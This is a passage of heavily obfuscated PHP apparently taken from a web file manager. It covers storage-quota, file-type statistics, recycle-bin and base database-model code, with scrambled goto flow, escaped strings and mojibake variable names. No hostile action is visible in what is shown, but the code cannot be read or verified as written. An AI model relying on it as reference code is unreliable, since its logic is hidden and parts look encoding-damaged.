$BŸˆïëÔñŒ[$cœƒ‘Ü£“][$fèÂ…Ó—¤[2382]] = $BŸˆïëÔñŒ[$cœƒ‘Ü£“][$fèÂ…Ó—¤[77]]; $BŸˆïëÔñŒ[$cœƒ‘Ü£“][$fèÂ…Ó—¤[77]] = 0; } goto bô¨ÚÓ•‚Ò; c¨ÁàŞğñˆ: $fèÂ…Ó—¤ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->sourceCacheClear($FˆÀÏ”¡); $c–¥‰Ó°´ = $this->sourceInfo($FˆÀÏ”¡); goto FÖ…¾‚Ë ; FÖ…¾‚Ë : $B¼ƒÈÀ’¬ = array($fèÂ…Ó—¤[520] => 1, $fèÂ…Ó—¤[527] => array($fèÂ…Ó—¤[485], $c–¥‰Ó°´[$fèÂ…Ó—¤[461]] . $FˆÀÏ”¡ . $fèÂ…Ó—¤[486])); $Aâ½÷“³± = $fèÂ…Ó—¤[2381]; $BŸˆïëÔñŒ = $this->field($Aâ½÷“³±)->where($B¼ƒÈÀ’¬)->select(); goto E‘³«¨ˆ«; bô¨ÚÓ•‚Ò: foreach ($cÂ„ä¬±“ô as $aÆ£ùå‚ˆŸ) { $c›³ÎòÃİÜ = $aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[463]] . $fèÂ…Ó—¤[33]; if (!isset($BŸˆïëÔñŒ[$c›³ÎòÃİÜ])) { continue; } if ($aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[397]] == $BŸˆïëÔñŒ[$c›³ÎòÃİÜ][$fèÂ…Ó—¤[397]]) { $BŸˆïëÔñŒ[$c›³ÎòÃİÜ][$fèÂ…Ó—¤[77]] += $aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[77]]; } } foreach ($BŸˆïëÔñŒ as $aÆ£ùå‚ˆŸ) { $E¨§½¿÷‹ = $this->parentLevelArray($aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[461]]); foreach ($E¨§½¿÷‹ as $c›³ÎòÃİÜ) { $c›³ÎòÃİÜ = $c›³ÎòÃİÜ . $fèÂ…Ó—¤[33]; if (!isset($BŸˆïëÔñŒ[$c›³ÎòÃİÜ])) { continue; } if ($aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[397]] == $BŸˆïëÔñŒ[$c›³ÎòÃİÜ][$fèÂ…Ó—¤[397]]) { $BŸˆïëÔñŒ[$c›³ÎòÃİÜ][$fèÂ…Ó—¤[77]] += $aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[77]]; } } } $Eƒ×º©Ã»¨ = array(); goto E„ƒ™ØÂà…; a‹ªİ„ÆÒÆ: } public function userSpaceReset($Aõ­  ¾ˆÕ = false) { $B©š”ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÅŠ´Â½¹Å = $this->where(array($B©š”ê[371] => self::TYPE_USER, $B©š”ê[458] => $Aõ­  ¾ˆÕ, $B©š”ê[370] => 0))->sum($B©š”ê[77]); Model($B©š”ê[476])->userEdit($Aõ­  ¾ˆÕ, array($B©š”ê[2098] => $CÅŠ´Â½¹Å)); } public function targetSpaceUpdate($DæğæÇô¡, $f¦Ğ°Ğ¡ãÌ) { $c‡Ú¨¶»ÁÅ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$f¦Ğ°Ğ¡ãÌ) { return; } if (!in_array($DæğæÇô¡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $AóŒÖçŒ = $this->targetSpaceSize($DæğæÇô¡, $f¦Ğ°Ğ¡ãÌ); if ($DæğæÇô¡ == self::TYPE_USER) { Model($c‡Ú¨¶»ÁÅ[476])->userEdit($f¦Ğ°Ğ¡ãÌ, array($c‡Ú¨¶»ÁÅ[2098] => $AóŒÖçŒ)); } else { if ($DæğæÇô¡ == self::TYPE_GROUP) { Model($c‡Ú¨¶»ÁÅ[460])->groupEdit($f¦Ğ°Ğ¡ãÌ, array($c‡Ú¨¶»ÁÅ[2098] => $AóŒÖçŒ)); } } } public function targetSpaceSize($aÄ¼¶ğÄë÷, $Cª›Æ¼ØÛÇ) { goto dºåå›Çá; FÙÆˆšİæ: $Eå–„âéò = array_to_keyvalue($Eå–„âéò, $fÎ‰ó¥Ï§[33], $fÎ‰ó¥Ï§[369]); $Eå–„âéò = array_unique(array_filter($Eå–„âéò)); if ($Eå–„âéò) { $Dõ¡ùÉÄ¤Ë = array($fÎ‰ó¥Ï§[383] => array($fÎ‰ó¥Ï§[384], $Eå–„âéò)); $BíÑ„¶¡± += floatval($this->where($Dõ¡ùÉÄ¤Ë)->sum($fÎ‰ó¥Ï§[77])); } goto d˜–÷ÜâÇÂ; d˜–÷ÜâÇÂ: return $BíÑ„¶¡±; goto bô¾¯£„Ö; dºåå›Çá: $fÎ‰ó¥Ï§ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c° °Œ’¬· = $this->sourceRoot($aÄ¼¶ğÄë÷, $Cª›Æ¼ØÛÇ, !0); if (!$c° °Œ’¬·) { return 0; } goto f±¥¦½‹Ÿ—; f±¥¦½‹Ÿ—: $BíÑ„¶¡± = floatval($c° °Œ’¬·[$fÎ‰ó¥Ï§[77]]); $Dõ¡ùÉÄ¤Ë = array($fÎ‰ó¥Ï§[527] => array($fÎ‰ó¥Ï§[485], $fÎ‰ó¥Ï§[472] . $c° °Œ’¬·[$fÎ‰ó¥Ï§[369]] . $fÎ‰ó¥Ï§[486])); $Eå–„âéò = Model($fÎ‰ó¥Ï§[395])->field($fÎ‰ó¥Ï§[383])->where($Dõ¡ùÉÄ¤Ë)->select(); goto FÙÆˆšİæ; bô¾¯£„Ö: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($cÀì¢™Ü¢) { return $this->fileTypeProfile($cÀì¢™Ü¢, SourceModel::TYPE_USER); } public function groupFileTypeProfile($då²ÚÔ·Ñ–) { return $this->fileTypeProfile($då²ÚÔ·Ñ–, SourceModel::TYPE_GROUP); } private function fileTypeProfile($C×šàÚ»¬Ã, $BÑ»§®ÁÚŒ) { goto eçğ†²×›×; E¡ù¸ñ—½£: foreach ($B£´šÄëéä as $aÄ¶ÀÔá¤ => $c’Ü¸ éØ) { $fà¼¬›´ì‰[$c¬ÉÍº‡°Ä[372]] = $this->fileTypeWhere($aÄ¶ÀÔá¤); $dÊÑèŒ†¿â[$aÄ¶ÀÔá¤] = array($c¬ÉÍº‡°Ä[2385] => $c’Ü¸ éØ[$c¬ÉÍº‡°Ä[28]], $c¬ÉÍº‡°Ä[2386] => $this->where($fà¼¬›´ì‰)->count(), $c¬ÉÍº‡°Ä[522] => $this->where($fà¼¬›´ì‰)->sum($c¬ÉÍº‡°Ä[77])); } Cache::set($Dò¡áÕ¯øÓ, $dÊÑèŒ†¿â, 1200); return $dÊÑèŒ†¿â; goto e²ŠƒñŸ¯¢; AĞ¶ÀŞ™øô: $dÊÑèŒ†¿â = array(); $dÊÑèŒ†¿â[$c¬ÉÍº‡°Ä[2384]] = array($c¬ÉÍº‡°Ä[2385] => LNG($c¬ÉÍº‡°Ä[2384]), $c¬ÉÍº‡°Ä[2386] => $this->where($fà¼¬›´ì‰)->count(), $c¬ÉÍº‡°Ä[522] => $this->where($fà¼¬›´ì‰)->sum($c¬ÉÍº‡°Ä[77])); $B£´šÄëéä = KodIO::fileTypeList(); goto E¡ù¸ñ—½£; eçğ†²×›×: $c¬ÉÍº‡°Ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dò¡áÕ¯øÓ = $c¬ÉÍº‡°Ä[2383] . $C×šàÚ»¬Ã . $c¬ÉÍº‡°Ä[70] . $BÑ»§®ÁÚŒ; $C…ôŒ·…¹ = Cache::get($Dò¡áÕ¯øÓ); goto dçÕõ÷™Â; dçÕõ÷™Â: if ($C…ôŒ·…¹) { return $C…ôŒ·…¹; } $fà¼¬›´ì‰ = array($c¬ÉÍº‡°Ä[520] => 0); if ($C×šàÚ»¬Ã != !1) { $fà¼¬›´ì‰[$c¬ÉÍº‡°Ä[458]] = $C×šàÚ»¬Ã; $fà¼¬›´ì‰[$c¬ÉÍº‡°Ä[371]] = $BÑ»§®ÁÚŒ; } goto AĞ¶ÀŞ™øô; e²ŠƒñŸ¯¢: } public function fileNameExist($bµ¨ÊŸ½„, $Eáä£ø¡Ë‰) { $A öñäÅ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AŒà¿©®Õ¬ = $this->childList($bµ¨ÊŸ½„); foreach ($AŒà¿©®Õ¬ as $CÒÎ“‰‘¡) { if ($CÒÎ“‰‘¡[$A öñäÅ[28]] == $Eáä£ø¡Ë‰) { return $CÒÎ“‰‘¡[$A öñäÅ[369]]; } } return !1; } public function childList($e‚À¸İ¸‘) { goto d×Şé Ş¥ƒ; D¬‹ÃÔ¶ÁÚ: self::$cacheChildList[$CáÍ•¦†åÀ] = $E¦Ó¢„¡İ; foreach ($E¦Ó¢„¡İ as $BÂ‡á™—Æ) { $CáÍ•¦†åÀ = $DßêŒ¨Ìóè[410] . $BÂ‡á™—Æ[$DßêŒ¨Ìóè[369]]; self::$cacheSourceInfo[$CáÍ•¦†åÀ] = $BÂ‡á™—Æ; } return $E¦Ó¢„¡İ; goto añ×åìÇ¹‹; d×Şé Ş¥ƒ: $DßêŒ¨Ìóè =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CáÍ•¦†åÀ = $DßêŒ¨Ìóè[2364] . $e‚À¸İ¸‘; if (isset(self::$cacheChildList[$CáÍ•¦†åÀ])) { return self::$cacheChildList[$CáÍ•¦†åÀ]; } goto aÓÍëŒ…Í; aÓÍëŒ…Í: $d§÷ê×À = array($DßêŒ¨Ìóè[463] => intval($e‚À¸İ¸‘), $DßêŒ¨Ìóè[397] => 0); $E¦Ó¢„¡İ = $this->where($d§÷ê×À)->select(); $E¦Ó¢„¡İ = $E¦Ó¢„¡İ ? $E¦Ó¢„¡İ : array(); goto D¬‹ÃÔ¶ÁÚ; añ×åìÇ¹‹: } public function fileNameAuto($A—¢ÌÅÕšÓ, $dÂÉ££‚¨è, $Fá®öºÄË = REPEAT_RENAME, $Cöéâ¬‚÷Ç = false) { $aÁ•ò„¶ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÇ«øÒ¬¨„ = $this->childList($A—¢ÌÅÕšÓ); $eÚÒÇŒ‘²¦ = array_to_keyvalue($CÇ«øÒ¬¨„, $aÁ•ò„¶ê[33], $aÁ•ò„¶ê[28]); return $this->fileNameAutoGet($eÚÒÇŒ‘²¦, $dÂÉ££‚¨è, $Fá®öºÄË, $Cöéâ¬‚÷Ç); } public function fileNameAutoGet($cŞ©Å¼”Ã, $b®§ŸšÍÉµ, $bíùßÁŒ°Ê, $C¥ˆìÓÂ¾¤) { $BîŞÉ‘ŒÌÂ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($bíùßÁŒ°Ê == REPEAT_REPLACE || !$cŞ©Å¼”Ã || !in_array_not_case($b®§ŸšÍÉµ, $cŞ©Å¼”Ã) || $C¥ˆìÓÂ¾¤ && $bíùßÁŒ°Ê != REPEAT_RENAME_FOLDER) { return $b®§ŸšÍÉµ; } if ($bíùßÁŒ°Ê == REPEAT_SKIP) { return !1; } $eÑ±‘º¯µ = $BîŞÉ‘ŒÌÂ[91] . get_path_ext($b®§ŸšÍÉµ); $eÑ±‘º¯µ = $eÑ±‘º¯µ == $BîŞÉ‘ŒÌÂ[91] || $C¥ˆìÓÂ¾¤ ? $BîŞÉ‘ŒÌÂ[33] : $eÑ±‘º¯µ; for ($e¿¡íÕ¢Æ¶ = 1; $e¿¡íÕ¢Æ¶ <= count($cŞ©Å¼”Ã) + 1; $e¿¡íÕ¢Æ¶++) { $AñÈ‹¤¸…† = substr($b®§ŸšÍÉµ, 0, strlen($b®§ŸšÍÉµ) - strlen($eÑ±‘º¯µ)); $b›ğ‘±œ®ˆ = $AñÈ‹¤¸…† . "\50{$e¿¡íÕ¢Æ¶}\x29{$eÑ±‘º¯µ}"; if (!in_array_not_case($b›ğ‘±œ®ˆ, $cŞ©Å¼”Ã)) { return $b›ğ‘±œ®ˆ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\x72\x63\x65\x5f\162\145\143\171\143\154\x65"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\163\145\x72\164", "\x66\165\x6e\143\164\151\x6f\x6e")); public function listData($fÀŒçáéİ = false) { $FˆŞÛªÏ¬Ô =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fÀŒçáéİ = $fÀŒçáéİ ? $fÀŒçáéİ : USER_ID; $dì…Øçˆš = $this->where(array($FˆŞÛªÏ¬Ô[1432] => $fÀŒçáéİ))->select(); return array_to_keyvalue($dì…Øçˆš, $FˆŞÛªÏ¬Ô[33], $FˆŞÛªÏ¬Ô[369]); } public function moveToRecycle($cµ¿ôš‡ƒË) { goto dÕ²à†Š›; bÎ«œ‹ÒíÊ: if (!$Eçßßé³«Ù || $Eçßßé³«Ù[$cĞñ‚¿òÖÃ[397]] == $cĞñ‚¿òÖÃ[83]) { return; } $B…¡¼³ = array($cĞñ‚¿òÖÃ[383] => $cµ¿ôš‡ƒË, $cĞñ‚¿òÖÃ[1432] => USER_ID, $cĞñ‚¿òÖÃ[523] => $Eçßßé³«Ù[$cĞñ‚¿òÖÃ[371]], $cĞñ‚¿òÖÃ[524] => $Eçßßé³«Ù[$cĞñ‚¿òÖÃ[458]], $cĞñ‚¿òÖÃ[527] => $Eçßßé³«Ù[$cĞñ‚¿òÖÃ[461]]); $this->add($B…¡¼³); goto Cóˆø›äÖå; Cóˆø›äÖå: $this->recycleMove($cµ¿ôš‡ƒË, 1); if ($Eçßßé³«Ù[$cĞñ‚¿òÖÃ[370]] == $cĞñ‚¿òÖÃ[83]) { $Bìè‡õã„ = array($cĞñ‚¿òÖÃ[527] => array($cĞñ‚¿òÖÃ[485], $Eçßßé³«Ù[$cĞñ‚¿òÖÃ[461]] . $cµ¿ôš‡ƒË . $cĞñ‚¿òÖÃ[486])); $bÍô”¨»•->where($Bìè‡õã„)->setField($cĞñ‚¿òÖÃ[397], 1); } goto bÑì‘òÒ­Â; dÕ²à†Š›: $cĞñ‚¿òÖÃ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÍô”¨»• = Model($cĞñ‚¿òÖÃ[1121]); $Eçßßé³«Ù = $bÍô”¨»•->sourceInfo($cµ¿ôš‡ƒË); goto bÎ«œ‹ÒíÊ; bÑì‘òÒ­Â: } public function clear() { $this->remove(!1); } public function remove($bµÙ­¡¸‰Ã = false) { goto dÊ‰Ÿ®´„¡; a¬åùéñÍ¥: foreach ($BºâÛæ¡© as $D½Úó‹…‚†) { $E„Ü¡Ø¶ƒ†->targetSpaceUpdate($D½Úó‹…‚†[$a¸©ÓÃÙ‰å[371]], $D½Úó‹…‚†[$a¸©ÓÃÙ‰å[458]]); } goto Cë“íå‘ù°; dÊ‰Ÿ®´„¡: $a¸©ÓÃÙ‰å =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E„Ü¡Ø¶ƒ† = Model($a¸©ÓÃÙ‰å[1121]); $FÉªÌÁƒ¼¦ = $this->listData(); goto D…Á…±“à; D…Á…±“à: $bµÙ­¡¸‰Ã = $bµÙ­¡¸‰Ã === !1 ? !1 : $bµÙ­¡¸‰Ã; $BºâÛæ¡© = array(); foreach ($FÉªÌÁƒ¼¦ as $FŒÊäËëÉ™) { if ($bµÙ­¡¸‰Ã != !1 && !in_array($FŒÊäËëÉ™, $bµÙ­¡¸‰Ã)) { continue; } $d§êÇ™®Â¢ = $E„Ü¡Ø¶ƒ†->sourceInfo($FŒÊäËëÉ™); $E„Ü¡Ø¶ƒ†->remove($FŒÊäËëÉ™, !1); $C´ÕÎ±†æÊ = $d§êÇ™®Â¢[$a¸©ÓÃÙ‰å[371]] . $a¸©ÓÃÙ‰å[70] . $d§êÇ™®Â¢[$a¸©ÓÃÙ‰å[458]]; $BºâÛæ¡©[$C´ÕÎ±†æÊ] = array($a¸©ÓÃÙ‰å[523] => $d§êÇ™®Â¢[$a¸©ÓÃÙ‰å[371]], $a¸©ÓÃÙ‰å[458] => $d§êÇ™®Â¢[$a¸©ÓÃÙ‰å[458]]); $this->where(array($a¸©ÓÃÙ‰å[369] => $FŒÊäËëÉ™))->delete(); } goto a¬åùéñÍ¥; Cë“íå‘ù°: } public function restore($D—¦­³¯¥İ = false) { goto a…ìå®æÊ; d“¹‚»Èè: foreach ($f²É‘±ôåÁ as $Bë£“¼ô¼‚) { goto f˜ªÈ°–; a«áÉ¥ø„: if ($DŒÊî”„ù[$fôõ½Èç[397]] == $fôõ½Èç[83]) { continue; } $eÏî÷î‚…ç->lockMoveStart($Bë£“¼ô¼‚); $this->recycleMove($Bë£“¼ô¼‚, 0); goto aĞôÑ¹¯ ¢; eõ¹×¯î²¸: $C¢ïª½µ”‚[] = $b‘õ†• Üğ[$fôõ½Èç[463]]; if ($b‘õ†• Üğ[$fôõ½Èç[370]] == $fôõ½Èç[83]) { $C¢ïª½µ”‚[] = $Bë£“¼ô¼‚; } $eÏî÷î‚…ç->lockMoveEnd($Bë£“¼ô¼‚); goto dÄ‚§…éñ; aĞôÑ¹¯ ¢: if ($b‘õ†• Üğ[$fôõ½Èç[370]] == $fôõ½Èç[83]) { $e¯©ŠÕµˆ = array($fôõ½Èç[527] => array($fôõ½Èç[485], $b‘õ†• Üğ[$fôõ½Èç[461]] . $Bë£“¼ô¼‚ . $fôõ½Èç[486])); $eÏî÷î‚…ç->where($e¯©ŠÕµˆ)->setField($fôõ½Èç[397], 0); $this->restoreFolderChildren($Bë£“¼ô¼‚, $f²É‘±ôåÁ); } $this->where(array($fôõ½Èç[369] => $Bë£“¼ô¼‚))->delete(); $eÏî÷î‚…ç->folderSizeReset($b‘õ†• Üğ[$fôõ½Èç[463]]); goto eõ¹×¯î²¸; f˜ªÈ°–: if ($D—¦­³¯¥İ != !1 && !in_array($Bë£“¼ô¼‚, $D—¦­³¯¥İ)) { continue; } $b‘õ†• Üğ = $eÏî÷î‚…ç->sourceInfo($Bë£“¼ô¼‚); $DŒÊî”„ù = $eÏî÷î‚…ç->sourceInfo($b‘õ†• Üğ[$fôõ½Èç[463]]); goto a«áÉ¥ø„; dÄ‚§…éñ: } $eÏî÷î‚…ç->updateModifyTime($C¢ïª½µ”‚); goto e¸§„÷îé¶; a…ìå®æÊ: $fôõ½Èç =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÏî÷î‚…ç = Model($fôõ½Èç[1121]); $f²É‘±ôåÁ = $this->listData(); goto fˆ ÓŠ¶Ëç; fˆ ÓŠ¶Ëç: $D—¦­³¯¥İ = $D—¦­³¯¥İ == !1 ? !1 : $D—¦­³¯¥İ; if (!$f²É‘±ôåÁ) { return !0; } $C¢ïª½µ”‚ = array(); goto d“¹‚»Èè; e¸§„÷îé¶: } private function restoreFolderChildren($AåÄŒ¼¯‰ä, $cñ‚õ¶îùç) { goto c‚ç¬ä·êö; F–‚°¥Šíã: $b‰îäã”Íœ[$BĞŸ““ÔŞò[369]][1] = array_unique($b‰îäã”Íœ[$BĞŸ““ÔŞò[369]][1]); $b‰îäã”Íœ[$BĞŸ““ÔŞò[917]] = $BĞŸ““ÔŞò[2197]; $CÍ²İ™ŞˆŒ->where($b‰îäã”Íœ)->setField($BĞŸ““ÔŞò[397], 1); goto eù£–Ñùù§; eóÃ—ºÅ—: foreach ($cñ‚õ¶îùç as $a°ƒ°¥œ) { if ($a°ƒ°¥œ == $AåÄŒ¼¯‰ä) { continue; } if (!$CÍ²İ™ŞˆŒ->isParentOf($AåÄŒ¼¯‰ä, $a°ƒ°¥œ)) { continue; } $d­ºßæ = $CÍ²İ™ŞˆŒ->sourceInfo($a°ƒ°¥œ); if ($d­ºßæ[$BĞŸ““ÔŞò[370]] == $BĞŸ““ÔŞò[83]) { $b‰îäã”Íœ[] = array($BĞŸ““ÔŞò[527] => array($BĞŸ““ÔŞò[485], $d­ºßæ[$BĞŸ““ÔŞò[461]] . $a°ƒ°¥œ . $BĞŸ““ÔŞò[486])); } else { $b‰îäã”Íœ[$BĞŸ““ÔŞò[369]][1][] = $a°ƒ°¥œ; } } if (!$b‰îäã”Íœ[$BĞŸ““ÔŞò[369]][1]) { unset($b‰îäã”Íœ[$BĞŸ““ÔŞò[369]]); } if (!$b‰îäã”Íœ) { return; } goto F–‚°¥Šíã; c‚ç¬ä·êö: $BĞŸ““ÔŞò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÍ²İ™ŞˆŒ = Model($BĞŸ““ÔŞò[1121]); $b‰îäã”Íœ = array($BĞŸ““ÔŞò[369] => array($BĞŸ““ÔŞò[7], array())); goto eóÃ—ºÅ—; eù£–Ñùù§: } private function recycleMove($FÛÀî¤âÊÇ, $DÆÑá÷ñ÷Ì = 1) { $Aó––½Îõó =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÔóİ‡ß = Model($Aó––½Îõó[1121]); $DÈ¾ëÃÆ¡¬ = Model($Aó––½Îõó[2387]); $FŠ´»ñóÀ = array($Aó––½Îõó[369] => $FÛÀî¤âÊÇ); if ($DÆÑá÷ñ÷Ì) { $FÔóİ‡ß->where($FŠ´»ñóÀ)->setField($Aó––½Îõó[397], 1); $DÈ¾ëÃÆ¡¬->eventRecycle($FÛÀî¤âÊÇ, $Aó––½Îõó[2388]); } else { $cöÀ³…ïĞˆ = $FÔóİ‡ß->where($FŠ´»ñóÀ)->find(); $Fó÷øØñ—¹ = $cöÀ³…ïĞˆ[$Aó––½Îõó[370]] == $Aó––½Îõó[83]; $d¢İã™”ä§ = $FÔóİ‡ß->fileNameAuto($cöÀ³…ïĞˆ[$Aó––½Îõó[463]], $cöÀ³…ïĞˆ[$Aó––½Îõó[28]], REPEAT_RENAME_FOLDER, $Fó÷øØñ—¹); if ($d¢İã™”ä§ != $cöÀ³…ïĞˆ[$Aó––½Îõó[28]]) { $FÔóİ‡ß->rename($FÛÀî¤âÊÇ, $d¢İã™”ä§); } $FÔóİ‡ß->where($FŠ´»ñóÀ)->setField($Aó––½Îõó[397], 0); $DÈ¾ëÃÆ¡¬->eventRecycle($FÛÀî¤âÊÇ, $Aó––½Îõó[2389]); } } } goto Aî‰³¿¡¦Î; B÷òÉ ãšÖ: define($_SERVER[´Ù×Íå‘ÄõÛ][230], 0); define($_SERVER[´Ù×Íå‘ÄõÛ][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\x6f\162\144\145\162", "\141\154\x69\141\x73", "\x68\141\x76\151\x6e\147", "\147\162\157\x75\160", "\154\157\143\x6b", "\144\x69\x73\164\x69\x6e\143\164", "\x61\x75\x74\x6f", "\x66\x69\154\164\x65\x72", "\x76\141\154\x69\x64\141\x74\145", "\x72\145\x73\165\154\164", "\142\x69\x6e\x64", "\164\x6f\153\x65\x6e"); public function __construct($DôÓ¸İ‚É“ = '', $fï÷Ï¦ï = '', $AÊã¢˜¦§Ğ = '') { $DŒÍù¼ŠÇ– =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->_initialize(); if (!empty($DôÓ¸İ‚É“)) { if (strpos($DôÓ¸İ‚É“, $DŒÍù¼ŠÇ–[91])) { list($this->dbName, $this->name) = explode($DŒÍù¼ŠÇ–[91], $DôÓ¸İ‚É“); } else { $this->name = $DôÓ¸İ‚É“; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($fï÷Ï¦ï)) { $this->tablePrefix = $DŒÍù¼ŠÇ–[33]; } elseif ($DŒÍù¼ŠÇ–[33] != $fï÷Ï¦ï) { $this->tablePrefix = $fï÷Ï¦ï; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($DŒÍù¼ŠÇ–[232]); } $this->db(0, empty($this->connection) ? $AÊã¢˜¦§Ğ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $BÛã„º¢‰Æ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($this->fields)) { if (think_config($BÛã„º¢‰Æ[233])) { $fĞ­‡œÓŒÍ = $this->dbName ? $this->dbName : think_config($BÛã„º¢‰Æ[234]); $cøƒµìçÄ = think_var_cache($BÛã„º¢‰Æ[235] . strtolower(get_path_this($fĞ­‡œÓŒÍ) . $BÛã„º¢‰Æ[91] . $this->name)); if ($cøƒµìçÄ) { $C¥˜—¨¯§‹ = think_config($BÛã„º¢‰Æ[236]); if (empty($C¥˜—¨¯§‹) || $cøƒµìçÄ[$BÛã„º¢‰Æ[237]] == $C¥˜—¨¯§‹) { $this->fields = $cøƒµìçÄ; return; } } } $this->flush(); } } public function flush() { goto Fƒ–¥–Ã“¾; Fƒ–¥–Ã“¾: $Aã«ëöÅõ÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->db->setModel($this->name); $D¶…¦¤Ë = $this->db->getFields($this->getTableName()); goto aë‘×ˆ·Ã; Dä© ‹³¥¯: foreach ($D¶…¦¤Ë as $dêÂõ…«ê => $A¦ôŸƒ²‰) { $CíäÄÆÃÅÀ[$dêÂõ…«ê] = $A¦ôŸƒ²‰[$Aã«ëöÅõ÷[29]]; if ($A¦ôŸƒ²‰[$Aã«ëöÅõ÷[36]]) { $this->fields[$Aã«ëöÅõ÷[239]] = $dêÂõ…«ê; if ($A¦ôŸƒ²‰[$Aã«ëöÅõ÷[39]]) { $this->fields[$Aã«ëöÅõ÷[238]] = !0; } } } $this->fields[$Aã«ëöÅõ÷[240]] = $CíäÄÆÃÅÀ; if (think_config($Aã«ëöÅõ÷[236])) { $this->fields[$Aã«ëöÅõ÷[237]] = think_config($Aã«ëöÅõ÷[236]); } goto d´İ³Éä”×; aë‘×ˆ·Ã: if (!$D¶…¦¤Ë) { return !1; } $this->fields = array_keys($D¶…¦¤Ë); $this->fields[$Aã«ëöÅõ÷[238]] = !1; goto Dä© ‹³¥¯; d´İ³Éä”×: if (think_config($Aã«ëöÅõ÷[233])) { $A‰Ù åá–÷ = $this->dbName ? $this->dbName : think_config($Aã«ëöÅõ÷[234]); think_var_cache($Aã«ëöÅõ÷[235] . strtolower(get_path_this($A‰Ù åá–÷) . $Aã«ëöÅõ÷[91] . $this->name), $this->fields); } goto Bä÷ÒÓªåÇ; Bä÷ÒÓªåÇ: } public function switchModel($Cã«æ°å×, $c†‘ÉŸäõä = array()) { $C„¦Ú‡œÆÒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f˜­é‹ƒ±Œ = ucwords(strtolower($Cã«æ°å×)) . $C„¦Ú‡œÆÒ[241]; if (!class_exists($f˜­é‹ƒ±Œ)) { think_exception($f˜­é‹ƒ±Œ . think_lang($C„¦Ú‡œÆÒ[242])); } $this->_extModel = new $f˜­é‹ƒ±Œ($this->name); if (!empty($c†‘ÉŸäõä)) { foreach ($c†‘ÉŸäõä as $BàŠ¤×ÌÕ) { $this->_extModel->setProperty($BàŠ¤×ÌÕ, $this->{$BàŠ¤×ÌÕ}); } } return $this->_extModel; } public function __set($A©ÇæŒæÚ, $b‰Çã»ÚÙ‰) { $this->data[$A©ÇæŒæÚ] = $b‰Çã»ÚÙ‰; } public function __get($fã‡øâ•ß†) { return isset($this->data[$fã‡øâ•ß†]) ? $this->data[$fã‡øâ•ß†] : null; } public function __isset($F¿°´ë´ó­) { return isset($this->data[$F¿°´ë´ó­]); } public function __unset($B¢×À‡ÍÜ) { unset($this->data[$B¢×À‡ÍÜ]); } public function __call($a¤¬¸àÄ¹®, $F…… »Ğ©¡) { $fˆŒç¾—† =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (in_array(strtolower($a¤¬¸àÄ¹®), $this->methods, !0)) { $this->options[strtolower($a¤¬¸àÄ¹®)] = $F…… »Ğ©¡[0]; return $this; } elseif (in_array(strtolower($a¤¬¸àÄ¹®), array($fˆŒç¾—†[243], $fˆŒç¾—†[244], $fˆŒç¾—†[245], $fˆŒç¾—†[246], $fˆŒç¾—†[247]), !0)) { $b³Şİ…‰Àô = isset($F…… »Ğ©¡[0]) ? $F…… »Ğ©¡[0] : $fˆŒç¾—†[176]; $b³Şİ…‰Àô = $this->db->parseKey($b³Şİ…‰Àô); return $this->getField(strtoupper($a¤¬¸àÄ¹®) . $fˆŒç¾—†[248] . $b³Şİ…‰Àô . $fˆŒç¾—†[249] . $a¤¬¸àÄ¹®, $fˆŒç¾—†[243]); } elseif (strtolower(substr($a¤¬¸àÄ¹®, 0, 5)) == $fˆŒç¾—†[250]) { $b³Şİ…‰Àô = think_parse_name(substr($a¤¬¸àÄ¹®, 5)); $Bè–¼£²çğ[$b³Şİ…‰Àô] = $F…… »Ğ©¡[0]; return $this->where($Bè–¼£²çğ)->find(); } elseif (strtolower(substr($a¤¬¸àÄ¹®, 0, 10)) == $fˆŒç¾—†[251]) { $bøÌ”±…«Ô = think_parse_name(substr($a¤¬¸àÄ¹®, 10)); $Bè–¼£²çğ[$bøÌ”±…«Ô] = $F…… »Ğ©¡[0]; return $this->where($Bè–¼£²çğ)->getField($F…… »Ğ©¡[1]); } elseif (isset($this->_scope[$a¤¬¸àÄ¹®])) { return $this->scope($a¤¬¸àÄ¹®, $F…… »Ğ©¡[0]); } elseif (method_exists($this, $a¤¬¸àÄ¹®)) { array_unshift($F…… »Ğ©¡, $a¤¬¸àÄ¹®); 